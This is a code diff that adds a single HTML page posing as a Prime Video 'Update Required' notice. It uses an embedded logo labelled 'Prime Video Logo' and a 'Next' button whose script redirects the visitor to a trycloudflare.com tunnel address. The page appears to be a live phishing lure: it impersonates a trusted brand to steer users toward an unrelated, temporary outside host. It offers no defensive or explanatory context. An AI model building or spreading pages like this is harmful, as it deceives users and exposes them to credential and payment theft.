@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Update Required</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f6;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        .logo img {
+            height: 60px; /* Adjust the height as needed */
+            width: auto; /* Maintain aspect ratio */
+        }
+        .heading {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+        .button {
+            background-color: #ffee00e5;
+            color: #131212;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .button:hover {
+            background-color: #ffee00e5;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="data:image/png;base64,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" alt="Prime Video Logo">
+        </div>
+        <div class="heading">Update Required</div>
+        <button class="button" onclick="redirectToURL()">Next</button>
+    </div>
+
+    <script>
+        function redirectToURL() {
+            window.location.href = 'https://strain-planned-arlington-pepper.trycloudflare.com'; // Replace with your desired URL
+        }
+    </script>
+</body>
+</html>
